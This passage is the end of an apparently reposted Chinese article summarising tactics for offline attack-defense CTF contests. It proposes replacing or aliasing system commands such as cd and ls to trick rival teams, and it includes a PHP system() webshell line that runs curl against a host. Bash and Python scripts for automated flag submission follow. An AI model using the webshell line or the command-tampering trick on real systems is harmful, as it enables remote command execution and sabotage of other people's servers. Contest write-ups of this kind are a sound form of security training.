monospace;font-size:13px;line-height:33px;;padding: 2px 4px;background: rgb(238, 238, 238);border-radius: 3px;">getflag</code>命令，或者<code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;background: rgb(238, 238, 238);border-radius: 3px;">curl</code>访问某个url获取flag，然后获取到一个字符串，然后在答题平台上提交这段字符串即可获取分数。但有时候getflag时因为webshell丢了或其他原因，会导致服务器显示Error，那我们是不是可以故意利用这种报错来欺骗不细心的竞争对手呢？</p><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">怎样实现？比如我们可以添加<code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;background: rgb(238, 238, 238);border-radius: 3px;">alias</code>别名，或者我们可以把这些命令更改或者替换掉，换成一些伪装命令程序。再换一层想想，接着上面的思路，如果我们替换或者伪装了系统命令，对方getshell之后，进来发现<code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;background: rgb(238, 238, 238);border-radius: 3px;">cd</code>，<code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;background: rgb(238, 238, 238);border-radius: 3px;">ls</code>等命令都没法用，会怎么样呢？</p><h4 style="margin-top: 20px;margin-bottom: 15px;padding-top: 10px;font-weight: bold;line-height: 1.5;font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;color: rgb(85, 85, 85);white-space: normal;background-color: rgb(255, 255, 255);">其他</h4><h5 style="margin-top: 20px;margin-bottom: 15px;padding-top: 10px;font-weight: bold;line-height: 1.5;font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;color: rgb(85, 85, 85);white-space: normal;background-color: rgb(255, 255, 255);">flag获取</h5><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">线下赛可以直接使用<code style="font family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace;font-size:13px;line-height:33px;;padding: 2px 4px;background: rgb(238, 238, 238);border-radius: 3px;">&lt;?php echo system("curl 10.0.0.2"); ?&gt;</code>之类的</p><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);">或者</p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t" mpa-from-tpl="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 72px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">#!/bin/bash</span><br mpa-from-tpl="t"  /><span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">while</span> <span class="hljs-default-literal" style="color: rgb(86, 182, 194);background: rgba(0, 0, 0, 0);display: inline;width: 27px;text-decoration: none solid rgb(86, 182, 194);font-weight: 400;font-style: normal;">true</span><br mpa-from-tpl="t"  /><span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">do</span><br mpa-from-tpl="t"  /> flag=$(curl <span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 165px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'http://xx.xx.xx.xx:8080'</span>)<br mpa-from-tpl="t"  /> curl --cookie <span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 152px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">"PHPSESSID=YourCookie;"</span> --data <span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">"key="</span><span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 47px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">${flag}</span> <span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 244px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">"http://XX.XX.XX.XX/index.php/submit"</span><br mpa-from-tpl="t"  /> sleep 1s<br mpa-from-tpl="t"  /><span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">done</span></code></pre></section><p style="margin-bottom: 25px;color: rgb(85, 85, 85);font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bold;">批量提交flag</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t" mpa-from-tpl="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default">#!/usr/bin/env <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">python</span><br mpa-from-tpl="t"  />import sys<br mpa-from-tpl="t"  />import json<br mpa-from-tpl="t"  />import urllib<br mpa-from-tpl="t"  />import httplib<br mpa-from-tpl="t"  />server_host = <span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 86px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'xx.xx.xx.xx'</span><br mpa-from-tpl="t"  />server_port = <span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">80</span><br mpa-from-tpl="t"  />def submit(team_token, flag, host=server_host, port=server_port, timeout=<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 7px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">5</span>):<br mpa-from-tpl="t"  /> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">if</span> not team_token <span class="hljs-default-built_in" style="color: rgb(230, 192, 123);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(230, 192, 123);font-weight: 400;font-style: normal;">or</span> not fla<span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">g:</span><br mpa-from-tpl="t"  /> raise Exception(<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 198px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'team token or flag not found'</span>)<br mpa-from-tpl="t"  /> conn = httplib.HTTPConnection(host, port, timeout=timeout)<br mpa-from-tpl="t"  /> params = urllib.urlencode({<br mpa-from-tpl="t"  /> <span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 46px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'token'</span>: team_token,<br mpa-from-tpl="t"  /> <span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'flag'</span>: flag,<br mpa-from-tpl="t"  /> })<br mpa-from-tpl="t"  /> headers = {<br mpa-from-tpl="t"  /> <span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 92px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">"Content-type"</span>: <span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 231px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">"application/x-www-form-urlencoded"</span><br mpa-from-tpl="t"  /> }<br mpa-from-tpl="t"  /> conn.request(<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 40px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'POST'</span>, <span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 118px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'/api/submit_flag'</span>, params, headers)<br mpa-from-tpl="t"  /> response = conn.getresponse()<br mpa-from-tpl="t"  /> data = response.<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">read</span>()<br mpa-from-tpl="t"  /> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 40px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">return</span> json.loads(data)<br mpa-from-tpl="t"  /><br mpa-from-tpl="t"  /><span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">if</span> __name__ == <span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 66px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'__main__'</span>:<br mpa-from-tpl="t"  /> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">if</span> <span class="hljs-default-built_in" style="color: rgb(230, 192, 123);background: rgba(0, 0, 0, 0);display: inline;width: 20px;text-decoration: none solid rgb(230, 192, 123);font-weight: 400;font-style: normal;">len</span>(sys.<span class="hljs-default-built_in" style="color: rgb(230, 192, 123);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(230, 192, 123);font-weight: 400;font-style: normal;">argv</span>) &lt; <span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">3</span>:<br mpa-from-tpl="t"  /> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">print</span> <span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 277px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'usage: ./submitflag.py $team_token $flag'</span><br mpa-from-tpl="t"  /> sys.<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">exit</span>()<br mpa-from-tpl="t"  /> host = server_host<br mpa-from-tpl="t"  /> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">if</span> <span class="hljs-default-built_in" style="color: rgb(230, 192, 123);background: rgba(0, 0, 0, 0);display: inline;width: 20px;text-decoration: none solid rgb(230, 192, 123);font-weight: 400;font-style: normal;">len</span>(sys.<span class="hljs-default-built_in" style="color: rgb(230, 192, 123);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(230, 192, 123);font-weight: 400;font-style: normal;">argv</span>) &gt; <span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">3</span>:<br mpa-from-tpl="t"  /> host = sys.<span class="hljs-default-built_in" style="color: rgb(230, 192, 123);background: rgba(0, 0, 0, 0);display: inline;width: 27px;text-decoration: none solid rgb(230, 192, 123);font-weight: 400;font-style: normal;">argv</span>[<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 7px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">3</span>]<br mpa-from-tpl="t"  /> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">print</span> json.dumps(submit(sys.<span class="hljs-default-built_in" style="color: rgb(230, 192, 123);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(230, 192, 123);font-weight: 400;font-style: normal;">argv</span>[<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">1</span>], sys.<span class="hljs-default-built_in" style="color: rgb(230, 192, 123);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(230, 192, 123);font-weight: 400;font-style: normal;">argv</span>[<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">2</span>], host=host), <span class="hljs-default-built_in" style="color: rgb(230, 192, 123);background: rgba(0, 0, 0, 0);display: inline;width: 40px;text-decoration: none solid rgb(230, 192, 123);font-weight: 400;font-style: normal;">indent</span>=<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 7px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">4</span>)</code></pre></section><h5 style="margin-top: 20px;margin-bottom: 15px;padding-top: 10px;font-weight: bold;line-height: 1.5;font family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;font-size:14px;line-height:34px;;color: rgb(85, 85, 85);white-space: normal;background-color: rgb(255, 255, 255);">参考来源:</h5><p><span style="font-size:10px;line-height:30px;;color: rgb(0, 122, 170);">http://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/</span></p><p><span style="font-size:10px;line-height:30px;;color: rgb(0, 122, 170);">https://www.anquanke.com/post/id/86984</span></p><p><span style="font-size:10px;line-height:30px;;color: rgb(0, 122, 170);">http://tinyfisher.github.io/security/2017/10/02/CTF</span></p><p><span style="font-size:10px;line-height:30px;;color: rgb(0, 122, 170);">https://edwardchoijc.github.io/CTF%E7%BA%BF%E4%B8%8BAWD%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93.html</span></p><p style="text-align: center;"><img class="rich_pages" data-copyright="0" data-ratio="0.5197505197505198" src="图片/HACK学习呀_2019-05-31_CTF线下AWD经验总结/4_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" data-type="gif" data-w="962" style=""  /></p>
                <div class="msg_source_url"><a href="https://edwardchoijc.github.io/CTF%E7%BA%BF%E4%B8%8BAWD%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93.html">阅读原文</a></div></div>
</div>
</body>
</html>